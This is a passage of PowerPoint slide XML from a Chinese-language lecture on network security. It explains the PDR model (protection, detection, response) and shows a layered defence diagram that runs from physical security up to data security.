                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>保护就是采用一切可能的措施来保护网络、系统以及信息的安全。保护通常采用的技术及方法主要包括</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>加密、鉴别、访问控制、防火墙以及防病毒</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>等。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="直接箭头连接符 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4973591" y="4506644"/>
            <a:ext cx="684076" cy="290508"/>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5652120" y="4149080"/>
            <a:ext cx="3384376" cy="1846659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>检测（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Detection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>检测可以了解和评估网络和系统的安全状态，为安全防护和安全响应提供依据。检测技术主要包括</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>入侵检测 、漏洞检测以及网络扫描</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>等技术。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="直接箭头连接符 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2636682" y="4387511"/>
            <a:ext cx="485800" cy="409641"/>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7819" y="2764651"/>
            <a:ext cx="2555776" cy="2954655"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>响应（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>应急响应在安全模型中占有重要地位，是解决安全问题的最有效办法。解决安全问题就是解决</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>紧急响应和异常处理</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>问题，因此，建立</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>应急响应机制</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，形成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>快速安全响应的能力</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，对网络和系统而言至关重要。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="矩形 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="254547" y="1222423"/>
            <a:ext cx="4605485" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>美国国际互联网安全系统公司（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>ISS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）提出，最早体现主动防御思想的安全模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="矩形 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="439904" y="683985"/>
            <a:ext cx="2763944" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4100620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inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11"/>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arn(inVertical)">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p:cTn id="36" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="3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8209" y="1502514"/>
            <a:ext cx="6071022" cy="3303914"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="74759" name="Group 41"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1504675" y="1380662"/>
            <a:ext cx="6421179" cy="4855151"/>
            <a:chOff x="1066" y="709"/>
            <a:chExt cx="4044" cy="3264"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74763" name="Line 4"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1765" y="1928"/>
              <a:ext cx="2793" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveBottomLeft"/>
              <a:lightRig rig="legacyFlat3" dir="t"/>
            </a:scene3d>
            <a:sp3d extrusionH="887400" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:noFill/>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74764" name="Line 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1765" y="2363"/>
              <a:ext cx="2793" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveBottomLeft"/>
              <a:lightRig rig="legacyFlat3" dir="t"/>
            </a:scene3d>
            <a:sp3d extrusionH="887400" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:noFill/>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74765" name="Line 6"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1765" y="2798"/>
              <a:ext cx="2793" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveBottomLeft"/>
              <a:lightRig rig="legacyFlat3" dir="t"/>
            </a:scene3d>
            <a:sp3d extrusionH="887400" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:noFill/>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74766" name="Line 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1765" y="3190"/>
              <a:ext cx="2793" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveBottomLeft"/>
              <a:lightRig rig="legacyFlat3" dir="t"/>
            </a:scene3d>
            <a:sp3d extrusionH="887400" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:noFill/>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74767" name="Line 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1765" y="1492"/>
              <a:ext cx="2793" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveBottomLeft"/>
              <a:lightRig rig="legacyFlat3" dir="t"/>
            </a:scene3d>
            <a:sp3d extrusionH="887400" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:noFill/>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74768" name="Rectangle 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1066" y="709"/>
              <a:ext cx="4044" cy="3264"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="38100" cap="sq">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769" name="Rectangle 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1390" y="840"/>
              <a:ext cx="350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dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>系统审计、分析 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>– </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>入侵检测 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>– </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>定时响应（警告、拒绝服务）</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74770" name="Rectangle 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1390" y="1318"/>
              <a:ext cx="292" cy="2046"/>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系统</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>的第</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>一道</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>防线</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>防止</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>远程</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>攻击</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74771" name="Rectangle 13"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1932" y="1362"/>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文件、数据安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74772" name="Rectangle 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1932" y="1797"/>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应用服务层安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74773" name="Rectangle 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1932" y="2232"/>
              <a:ext cx="792" cy="262"/>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系统服务层安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74774" name="Rectangle 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1932" y="2668"/>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系统内核安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74775" name="Rectangle 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1932" y="3103"/>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物理安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74776" name="Rectangle 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2974" y="1318"/>
              <a:ext cx="292" cy="2046"/>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dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>系统</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>的第</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>二道</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>防线</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
